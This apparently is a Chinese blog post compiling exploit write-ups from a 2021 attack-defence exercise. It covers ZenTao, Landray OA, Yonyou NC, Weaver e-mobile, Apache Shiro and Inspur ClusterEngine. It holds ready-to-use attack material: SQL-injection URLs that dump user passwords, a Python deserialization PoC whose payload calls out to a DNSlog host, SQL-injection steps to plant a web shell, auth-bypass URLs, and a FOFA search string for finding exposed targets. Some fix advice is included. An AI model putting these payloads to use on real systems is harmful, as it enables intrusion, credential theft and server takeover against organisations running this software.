<p><img src="/image/2021.4.9%20HVV%20%20%E6%83%85%E6%8A%A5%E5%85%B1%E4%BA%AB/5_640wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1.webp"></p>
<p><img src="/image/2021.4.9%20HVV%20%20%E6%83%85%E6%8A%A5%E5%85%B1%E4%BA%AB/2_640wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1.dat"></p>
<p><img src="/image/2021.4.9%20HVV%20%20%E6%83%85%E6%8A%A5%E5%85%B1%E4%BA%AB/3_640wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1.png"></p>
<p><img src="/image/2021.4.9%20HVV%20%20%E6%83%85%E6%8A%A5%E5%85%B1%E4%BA%AB/3_640wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1.dat"></p>
<p><img src="/image/2021.4.9%20HVV%20%20%E6%83%85%E6%8A%A5%E5%85%B1%E4%BA%AB/4_640wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1.dat"></p>
<p><img src="/image/2021.4.9%20HVV%20%20%E6%83%85%E6%8A%A5%E5%85%B1%E4%BA%AB/5_640wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1.dat"></p>
<p><img src="/image/2021.4.9%20HVV%20%20%E6%83%85%E6%8A%A5%E5%85%B1%E4%BA%AB/6_640wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1.dat"></p>
<p><img src="/image/2021.4.9%20HVV%20%20%E6%83%85%E6%8A%A5%E5%85%B1%E4%BA%AB/7_640wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1.dat"></p>
<h1 id="禅道-11-6-sql注入漏洞"><a href="#禅道-11-6-sql注入漏洞" class="headerlink" title="禅道 11.6 sql注入漏洞"></a>禅道 11.6 sql注入漏洞</h1><p>漏洞url:</p>
<pre><code>http://xxx.xxx/zentaopms_11.6/www/api-getModel-user-getRealNameAndEmails-users=admin
http://xxx.xxx/zentaopms_11.6/www/api-getModel-api-sql-sql=select+account,password+from+zt_user</code></pre>
<p>这里简单说下禅道目前最新版所采用的pathinfo模式，首先通过传参确定进入的control文件为api，对应的method为getModel，接着开始对参数进行赋值，其中moduleName为api，methodName=sql，最后的param为sql=select+account,password+from+zt_user，那么调用了call_user_func_array函数后，会进入到api目录下的model文件，对应调用其中的sql函数，并通过赋值，将sql变量赋值为select+account,password+from+zt_user，最后执行query语句</p>
<h1 id="蓝凌oa任意文件写入"><a href="#蓝凌oa任意文件写入" class="headerlink" title="蓝凌oa任意文件写入"></a>蓝凌oa任意文件写入</h1><p>漏洞在<code>/sys/search/sys_search_main/sysSearchMain.do</code> 下面，这里也给出了 <code>method</code> 为 <code>editrParam</code>。参数为 <code>FdParameters</code><br>已经很明确了,那么复现一下。</p>
<p>在 <code>com.landray.kmss.sys.search.jar</code> 中的<code>com.landray.kmss.sys.search.actions.SysSearchMainAction</code> 类。<br><code>method</code> 为 <code>editrParam</code>。  </p>
<p><img src="/image/%E8%93%9D%E5%87%8Coa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/1_image.png"></p>
<p>看下流程。  </p>
<p><img src="/image/%E8%93%9D%E5%87%8Coa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/2_image.png"></p>
<p>大概就是对 <code>fdParemNames</code> 的内容进行了判空。如果不为空。进入<br><code>SysSearchDictUtil.getParamConditionEntry</code> 方法。其实这一步不重要。因为后面这<br>一步也没啥用。就讲讲。。<br>主要还是在 <code>setParametersToSearchConditionInfo</code> 方法。  </p>
<p><img src="/image/%E8%93%9D%E5%87%8Coa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/3_image.png"></p>
<p>也是对 <code>fdParemNames</code> 进行了一次判空。然后传入<br><code>ObjectXML.objectXMLDecoderByString</code> 方法。这里就是漏洞点了<br>追过去就更好理解了。讲传入进来的 string 字符进行替换。然后讲其载入字节数组缓冲区,<br>在传递给 <code>objectXmlDecoder</code>。</p>
<p><img src="/image/%E8%93%9D%E5%87%8Coa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/4_image.png"></p>
<p>在 <code>objectXmlDecoder</code> 中。就更明显了。典型的 xmlDecoder 反序列化。<br>整体流程只对 <code>FdParameters</code> 的内容进行了一些内容替换。<br>导致 <code>xmlDecoder</code> 反序列化漏洞。<br>本地 POC:<br>Xmldecoder payload 生成<br><a target="_blank" rel="noopener" href="https://github.com/mhaskar/XMLDecoder-payload-generator">https://github.com/mhaskar/XMLDecoder-payload-generator</a></p>
<p><img src="/image/%E8%93%9D%E5%87%8Coa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/5_image.png"></p>
<p>Code:</p>
<p><img src="/image/%E8%93%9D%E5%87%8Coa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/6_image.png"></p>
<p><img src="/image/%E8%93%9D%E5%87%8Coa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/7_image.png"></p>
<p><img src="/image/%E8%93%9D%E5%87%8Coa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/8_image.png"></p>
<p><img src="/image/%E8%93%9D%E5%87%8Coa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/9_image.png"></p>
<p>当然,别多想。这是个后台洞。因为开放的白名单只有以下几个:</p>
<p><img src="/image/%E8%93%9D%E5%87%8Coa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/10_image.png"></p>
<h1 id="用友NC反序列化"><a href="#用友NC反序列化" class="headerlink" title="用友NC反序列化"></a>用友NC反序列化</h1><p><img src="/image/2021.4.9%20HVV%20%20%E6%83%85%E6%8A%A5%E5%85%B1%E4%BA%AB/4_640wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1.png"></p>
<p>捕获到攻击队利用用友nc反序列</p>
<p>目前测试影响版本：nc6.5</p>
<p>漏洞url为：</p>
<p><code>**/service/~xbrl/XbrlPersistenceServlet**</code></p>
<p><strong>poc：</strong></p>
<pre><code>import requests
import threadpool
import urllib3
import sys
import base64

ip = &quot;&quot;
dnslog = &quot;\x79\x37\x64\x70\&quot; #dnslog把字符串转16进制替换该段，测试用的ceye.io可以回显
data = &quot;\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x01\x73\x72\x00\x0c\x6a\x61\x76\x61\x2e\x6e\x65\x74\x2e\x55\x52\x4c\x96\x25\x37\x36\x1a\xfc\xe4\x72\x03\x00\x07\x49\x00\x08\x68\x61\x73\x68\x43\x6f\x64\x65\x49\x00\x04\x70\x6f\x72\x74\x4c\x00\x09\x61\x75\x74\x68\x6f\x72\x69\x74\x79\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x04\x66\x69\x6c\x65\x71\x00\x7e\x00\x03\x4c\x00\x04\x68\x6f\x73\x74\x71\x00\x7e\x00\x03\x4c\x00\x08\x70\x72\x6f\x74\x6f\x63\x6f\x6c\x71\x00\x7e\x00\x03\x4c\x00\x03\x72\x65\x66\x71\x00\x7e\x00\x03\x78\x70\xff\xff\xff\xff\x00\x00\x00\x50\x74\x00\x11&quot;+dnslog+&quot;\x3a\x38\x30\x74\x00\x00\x74\x00\x0e&quot;+dnslog+&quot;\x74\x00\x04\x68\x74\x74\x70\x70\x78\x74\x00\x18\x68\x74\x74\x70\x3a\x2f\x2f&quot;+dnslog+&quot;\x3a\x38\x30\x78&quot;

uploadHeader=&#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&quot;&#125;
req = requests.post(&quot;http://+&quot;ip&quot;+/service/~xbrl/XbrlPersistenceServlet&quot;, headers=uploadHeader, verify=False, data=data, timeout=25)
print (req.text)</code></pre>
<p>成功回显</p>
<h1 id="泛微e-mobile-0day"><a href="#泛微e-mobile-0day" class="headerlink" title="泛微e-mobile 0day"></a>泛微e-mobile 0day</h1><h2 id="mp-test-com-89-系统SQL注入getshell"><a href="#mp-test-com-89-系统SQL注入getshell" class="headerlink" title="mp.test.com:89 系统SQL注入getshell"></a>mp.test.com:89 系统SQL注入getshell</h2><h3 id="漏洞类型：SQL注入"><a href="#漏洞类型：SQL注入" class="headerlink" title="漏洞类型：SQL注入"></a>漏洞类型：SQL注入</h3><h3 id="漏洞等级：严重"><a href="#漏洞等级：严重" class="headerlink" title="漏洞等级：严重"></a>漏洞等级：严重</h3><h3 id="漏洞URL："><a href="#漏洞URL：" class="headerlink" title="漏洞URL： "></a>漏洞URL： </h3><p><a target="_blank" rel="noopener" href="http://mp.test.com:89/message.do">http://mp.test.com:89/message.do</a></p>
<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述: "></a>漏洞描述: </h3><p>泛微Emobile系统配合SQL注入导出shell</p>
<h3 id="漏洞详细："><a href="#漏洞详细：" class="headerlink" title="漏洞详细："></a>漏洞详细：</h3><p>泛微Emobile系统配合SQL注入导出shell</p>
<p>这里通过client.do接口（method为pullmsg），其中”udid”参数存在注入。</p>
<p>后端使用H2数据库，可以直接导出shell，操作过程如下：</p>
<p>因为emobile中限定只能访问action，像jsp等文件无法直接访问，所以这里选择覆盖/WEB-INF/page/message.jsp</p>
<p>当访问message.do接口时，会使用该jsp文件作为模板，这样就可以访问到写入的shell了。</p>
<p>第一步，将cmdshell写入表中：</p>
<p><img src="/image/%E6%B3%9B%E5%BE%AEe-mobile%200day/%E5%9B%BE%E7%89%871.png"></p>
<p>第二步，导出shell到指定文件：</p>
<p><img src="/image/%E6%B3%9B%E5%BE%AEe-mobile%200day/%E5%9B%BE%E7%89%872.png"></p>
<p>第三步，通过小马上传cmd写入到自身：</p>
<p><img src="/image/%E6%B3%9B%E5%BE%AEe-mobile%200day/%E5%9B%BE%E7%89%873.png"></p>
<p>第四步，访问shell 密码c：</p>
<p><a target="_blank" rel="noopener" href="http://mp.test.cn:89/message.do">http://mp.test.cn:89/message.do</a><br>执行ipconfig：</p>
<p><img src="/image/%E6%B3%9B%E5%BE%AEe-mobile%200day/%E5%9B%BE%E7%89%874.png"></p>
<p>数据包字数超限制可以将获取到的信息转存至别的服务器。</p>
<h3 id="平台方案："><a href="#平台方案：" class="headerlink" title="平台方案："></a>平台方案：</h3><p>1.修改Web应用服务的软件部分，增加对客户端提交数据的合法性验证，至少严格过滤SQL语句中的关键字，并且所有验证都应该在服务器端实现，以防客户端控制被绕过。验证GET、POST、COOKIE等方法中URL后面跟的参数，需过滤的关键字有’ 单引号、””双引号、\‘反斜杠单引号、\“”反斜杠双引号、)括号、;分号、–双减号、+加号。以及SQL关键字，注意对于关键字要对大小写都识别。</p>
<p>2.建议降低Web应用访问使用较低权限的用户访问数据库。不要使用数据库管理员等高权限的用户访问数据库。</p>
<p>3.使用安全的框架如Qframe或使用通用防注入脚本。</p>
<p>4.尽量使用预编译的方式执行SQL。</p>
<p>5.对于将进入SQL语句拼接前的参数,数字型参数对数字进行数字型检测，并检测范围,字符型参数对参数进行转义。</p>
<p>6.为了防止二次注入，可以在二次拼接SQL语句前，对取出的参数进行转义。</p>
<h1 id="Apache-Shiro-两种姿势绕过认证分析（CVE-2020-17523）"><a href="#Apache-Shiro-两种姿势绕过认证分析（CVE-2020-17523）" class="headerlink" title="Apache Shiro 两种姿势绕过认证分析（CVE-2020-17523）"></a>Apache Shiro 两种姿势绕过认证分析（CVE-2020-17523）</h1><p>作者：jweny<a target="_blank" rel="noopener" href="https://github.com/360">@360</a>云安全</p>
<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API，您可以快速、轻松地获得任何应用程序，从最小的移动应用程序到最大的网络和企业应用程序。</p>
<p>当它和 Spring 结合使用时，在一定权限匹配规则下，攻击者可通过构造特殊的 HTTP 请求包完成身份认证绕过。</p>
<p>影响范围：Apache Shiro &lt; 1.7.1</p>
<h2 id="0x02-漏洞环境搭建"><a href="#0x02-漏洞环境搭建" class="headerlink" title="0x02 漏洞环境搭建"></a>0x02 漏洞环境搭建</h2><p>shiro 1.7.0</p>
<p><a target="_blank" rel="noopener" href="https://github.com/jweny/shiro-cve-2020-17523">https://github.com/jweny/shiro-cve-2020-17523</a> 两种姿势的漏洞环境均已更新。</p>
<h2 id="0x03-poc测试"><a href="#0x03-poc测试" class="headerlink" title="0x03 poc测试"></a>0x03 poc测试</h2><p><strong>姿势一：</strong></p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8080/admin/%20">http://127.0.0.1:8080/admin/%20</a> 或 <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/admin/%20/">http://127.0.0.1:8080/admin/%20/</a></p>
<p>使用空格等空字符，可绕过shiro身份验证。</p>
<p><img src="/image/Apache%20Shiro%20%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%AE%A4%E8%AF%81%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-17523%EF%BC%89/t012fc7f58106adde5e.png"></p>
<p><strong>姿势二：</strong></p>
<p>经过和p0desta师傅交流，发现还有另一种特殊场景下的利用方式。</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8080/admin/">http://127.0.0.1:8080/admin/%2e</a> 或 <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/admin/">http://127.0.0.1:8080/admin/%2e/</a></p>
<p>但是<code>.</code>（还有<code>/</code>）在Spring的路径匹配的规则中是代表路径分隔符的，不作为普通字符进行匹配。因此在默认条件下访问 <code>/admin/.</code>会返回404。</p>
<p>但是在开启全路径的场景下<code>setAlwaysUseFullPath(true)</code>是可以正常匹配的。</p>
<p><img src="/image/Apache%20Shiro%20%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%AE%A4%E8%AF%81%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-17523%EF%BC%89/t0159da699790fd9a41.png"></p>
<h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><p>Shiro中对于URL的获取及匹配在<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain</code></p>
<p>先简单看下这个<code>getChain</code>方法：</p>
<p><img src="/image/Apache%20Shiro%20%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%AE%A4%E8%AF%81%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-17523%EF%BC%89/t0199aaba8b04fdaf03.png"></p>
<p><img src="/image/Apache%20Shiro%20%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%AE%A4%E8%AF%81%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-17523%EF%BC%89/t015e36091ba50b0d2e.png"></p>
<p>该方法先检查requestURI是否以<code>/</code>结尾，如果是，就删掉最后一个<code>/</code>。</p>
<p>然后在匹配路径的循环中，会先判断下路径规则pathPattern是否以<code>/</code>结尾，如果是也会删除。然后再去调用<code>pathMatches()</code>方法进行路径匹配。</p>
<p><strong>因此两种利用方式中，是否以</strong><code>**/**</code><strong>结尾都没有关系，因为开始经过</strong><code>**getChain**</code><strong>方法就会被删除。</strong></p>
<h3 id="4-1-空格绕过分析"><a href="#4-1-空格绕过分析" class="headerlink" title="4.1 空格绕过分析"></a>4.1 空格绕过分析</h3><p>关注下<code>pathMatches()</code>方法：</p>
<p>调出Evaluate，分别计算一下<code>pathMatches（&quot;/admin/*&quot;,&quot;/admin/1&quot;）</code>和<code>pathMatches（&quot;/admin/*&quot;,&quot;/admin/ &quot;）</code>，前者正常匹配，后者匹配失败。</p>
<p><img src="/image/Apache%20Shiro%20%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%AE%A4%E8%AF%81%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-17523%EF%BC%89/t01132ce8ecdcb0c569.png"></p>
<p><img src="/image/Apache%20Shiro%20%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%AE%A4%E8%AF%81%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-17523%EF%BC%89/t01c42bc944240f8d6b.png"></p>
<p>开始调试，调试开始会经过一阵漫长的F7。一直到<code>doMatch(&quot;/admin/*&quot;,&quot;/admin/ &quot;)</code>。可见，<code>tokenizeToStringArray</code>返回的pathDirs已经没有第二层路径了。因此会导致<code>/admin/*</code>和<code>/admin</code>不匹配。</p>
<p><img src="/image/Apache%20Shiro%20%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%AE%A4%E8%AF%81%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-17523%EF%BC%89/t01a2633e2800ca590d.png"></p>
<p>跟一下<code>tokenizeToStringArray</code>方法，发现其调用<code>tokenizeToStringArray</code>方法时的<code>trimTokens</code>参数为true。</p>
<p><img src="/image/Apache%20Shiro%20%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%AE%A4%E8%AF%81%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-17523%EF%BC%89/t01b9ac41d8a7e86ad0.png"></p>
<p>而<code>tokenizeToStringArray</code>方法，在参数<code>trimTokens</code>为true时，会经过<code>trim()</code>处理，因此导致空格被清除。再次返回<code>getChain</code>时最后一个<code>/</code>被删除。因此<code>tokenizeToStringArray</code>返回的pathDirs没有第二层路径。</p>
<p><img src="/image/Apache%20Shiro%20%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%AE%A4%E8%AF%81%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-17523%EF%BC%89/t014d2ae3dc07eea7c3.png"></p>
<p>总结一下：存在漏洞的shiro版本，由于调用<code>tokenizeToStringArray</code>方法时，<code>trimTokens</code>参数默认为true，空格会经过<code>trim()</code>处理，因此导致空格被清除。再次返回<code>getChain</code>时最后一个<code>/</code>被删除，所以<code>/admin</code>与<code>/admin/*</code>匹配失败，导致鉴权绕过。而Spring接受到的访问路径为<code>/admin/%20</code>，按照正常逻辑返回响应，因此导致权限被绕过。</p>
<h3 id="4-2-绕过分析"><a href="#4-2-绕过分析" class="headerlink" title="4.2 /./绕过分析"></a>4.2 /./绕过分析</h3><p>看到第二种姿势的<code>/.</code>和<code>/./</code>，是不是想起了某个熟悉方法？没错，就是<code>normalize()</code>。</p>
<p><img src="/image/Apache%20Shiro%20%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%AE%A4%E8%AF%81%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-17523%EF%BC%89/t01d59631245a416e97.png"></p>
<p>简单翻译下就是：</p>
<table>
<thead>
<tr>
<th>条件</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>正斜杠处理成反斜杠</td>
<td>\ -&gt; /</td>
</tr>
<tr>
<td>双反斜杠处理成反斜杠</td>
<td>// -&gt; /</td>
</tr>
<tr>
<td>以/.或者/..结尾，则在结尾添加/</td>
<td>/. -&gt; /./ /.. -&gt; /../</td>
</tr>
<tr>
<td>归一化处理/./</td>
<td>/./ -&gt; /</td>
</tr>
<tr>
<td>路径跳跃</td>
<td>/aaa/../bbb -&gt; /bbb</td>
</tr>
</tbody></table>
<p>所以<code>/admin/.</code>在被处理成<code>/admin/./</code>之后变成了<code>/admin/</code>。</p>
<p><img src="/image/Apache%20Shiro%20%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%AE%A4%E8%AF%81%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-17523%EF%BC%89/t01300e6daa1c5fee11.png"></p>
<p>在经过<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain</code>处理，由于<code>/</code>结尾，如果是，就删掉最后一个<code>/</code>，变成了<code>/admin</code>。<code> `/admin</code>与<code>/admin/*</code>不匹配，因此绕过了shiro鉴权。</p>
<p><img src="/image/Apache%20Shiro%20%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%AE%A4%E8%AF%81%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-17523%EF%BC%89/t0193785f7112943810.png"></p>
<p>而此时Spring收到的请求为<code>/admin/.</code>。<strong>如果没有开启全路径匹配的话，在Spring中</strong><code>**.**</code><strong>和</strong><code>**/**</code><strong>是作为路径分隔符的，不参与路径匹配。</strong>因此会匹配不到mapping，返回404。</p>
<p><img src="/image/Apache%20Shiro%20%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%AE%A4%E8%AF%81%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-17523%EF%BC%89/t01aa276dd7ac9e0694.png"></p>
<p>开启全路径匹配的话，会匹配整个url，因此Spring返回200。</p>
<p>这里附上开启全路径匹配的代码：</p>
<pre><code>@SpringBootApplication
public class SpringbootShiroApplication extends SpringBootServletInitializer implements BeanPostProcessor &#123;

    @Override
    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) &#123;
        return builder.sources(SpringbootShiroApplication.class);
    &#125;

    public static void main(String[] args) &#123;

        SpringApplication.run(SpringbootShiroApplication.class, args);
    &#125;

    @Override
    public Object postProcessBeforeInitialization(Object bean, String beanName)
            throws BeansException &#123;
        if (bean instanceof RequestMappingHandlerMapping) &#123;
            ((RequestMappingHandlerMapping) bean).setAlwaysUseFullPath(true);
        &#125;
        return bean;
    &#125;

    @Override
    public Object postProcessAfterInitialization(Object bean, String beanName)
            throws BeansException &#123;
        return bean;
    &#125;
&#125;</code></pre>
<h2 id="0x05-官方的修复方案"><a href="#0x05-官方的修复方案" class="headerlink" title="0x05 官方的修复方案"></a>0x05 官方的修复方案</h2><p>经过以上的分析，造成shiro权限绕过的原因有两个：</p>
<ol>
<li> <code>tokenizeToStringArray</code>函数没有正确处理空格。</li>
<li> 处理最后一个<code>/</code>的逻辑，不应在循环匹配路径的逻辑之前。</li>
</ol>
<p>因此官方的修复方案为：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/0842c27fa72d0da5de0c5723a66d402fe20903df">https://github.com/apache/shiro/commit/0842c27fa72d0da5de0c5723a66d402fe20903df</a></p>
<ol>
<li> 将<code>tokenizeToStringArray</code>的<code>trimTokens</code>参数置为false。</li>
</ol>
<p><img src="/image/Apache%20Shiro%20%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%AE%A4%E8%AF%81%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-17523%EF%BC%89/t0152810e20859903a1.png"></p>
<ol>
<li> 调整删除最后一个<code>/</code>的逻辑。修改成先匹配原始路径，匹配失败后再去走删除最后一个<code>/</code>的逻辑。</li>
</ol>
<p><img src="/image/Apache%20Shiro%20%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%AE%A4%E8%AF%81%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-17523%EF%BC%89/t01a13a496dda85a1e1.png"></p>
<h2 id="0x06-关于trim"><a href="#0x06-关于trim" class="headerlink" title="0x06 关于trim"></a>0x06 关于trim</h2><p>原理上来说<code>trim()</code>会清空字符串前后所有的whitespace，空格只是其中的一种，但是在测试中发现除了空格以外的其他whitespace，例如<code>%08</code>、<code>%09</code>、<code>%0a</code>，spring+tomcat 处理时都会返回400。</p>
<p>因此第一种姿势除了空格，尚未发现其他好用的payload。</p>
<h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/0842c27fa72d0da5de0c5723a66d402fe20903df">https://github.com/apache/shiro/commit/0842c27fa72d0da5de0c5723a66d402fe20903df</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/216096">https://www.anquanke.com/post/id/216096</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/syp172654682/p/9257282.html">https://www.cnblogs.com/syp172654682/p/9257282.html</a></p>
<h1 id="浪潮-ClusterEngineV4-0-任意命令执行"><a href="#浪潮-ClusterEngineV4-0-任意命令执行" class="headerlink" title="浪潮 ClusterEngineV4.0 任意命令执行"></a>浪潮 ClusterEngineV4.0 任意命令执行</h1><h2 id="漏洞关注点："><a href="#漏洞关注点：" class="headerlink" title="漏洞关注点："></a>漏洞关注点：</h2><p>/alarmConfig</p>
<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>浪潮ClusterEngine集群管理平台是专为浪潮天梭系列HPC产品定制的一款作业管理软件，该软件采用B/S架构，通过浏览器（IE，firefox等）进行操作，可以管理集群系统中的软硬件资源和用户提交的作业，根据集群中的资源使用情况来合理的调度用户提交的作业，从而达到提高资源的利用率和作业的执行效率的作用。其4.0版本存在任意命令执行漏洞。</p>
<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>攻击者通过发送精心构造的请求包到目标应用程序，将会造成远程命令执行漏洞。甚至获得目标站点的服务器权限。</p>
<h2 id="fofa-dork"><a href="#fofa-dork" class="headerlink" title="fofa_dork"></a>fofa_dork</h2><pre><code>title=&quot;TSCEV4.0&quot;</code></pre>
<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p><img src="/image/%E6%B5%AA%E6%BD%AE%20ClusterEngineV4.0%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1618123213_607299cd3f220dac5fa7a.png!small" alt="image.png"></p>
<h2 id="验证POC"><a href="#验证POC" class="headerlink" title="验证POC"></a>验证POC</h2><pre><code>pip3 install -r requirements.txt
python3 clusterengine_poc.py -u http://127.0.0.1:1111

def verify(self, first=False):
        target = self.scan_info[&#39;Target&#39;]
        verbose = self.scan_info[&#39;Verbose&#39;]
        headers = &#123;
            &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;
        &#125;
        payload = &quot;op=login&amp;username=asd&amp;password=asd&#39;&quot;
        try:
            url = urljoin(target, &#39;/login&#39;)
            resp = req(url, &#39;post&#39;, data=payload,headers=headers,verify=False)
            if (&#39;&#123;&quot;err&quot;&#39; in resp.text) and (&quot; syntax error: unexpected end of file&quot; in resp.text):
                log.highlight(&quot;found Inspur ClusterEngine v4.0 Remote Code Execution&quot;)
                self.scan_info[&#39;Success&#39;] = True
                self.scan_info[&#39;Ret&#39;][&#39;VerifyInfo&#39;][&#39;URL&#39;] = url
                self.scan_info[&#39;Ret&#39;][&#39;VerifyInfo&#39;][&#39;Payload&#39;] = payload
                self.scan_info[&#39;Ret&#39;][&#39;VerifyInfo&#39;][&#39;method&#39;] = &quot;POST&quot;
                return
        except Exception as e:
            log.info(&quot;[*]Request to target URL fail! &#123;&#125;&quot;.format(e))</code></pre>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>升级到修复版本</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Harbor</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://harbors.vip/post/67da50f7.html">https://harbors.vip/post/67da50f7.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://harbors.vip" target="_blank">Harbor</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/2021/">2021</a><a class="post-meta__tags" href="/tags/poc/">poc</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><a 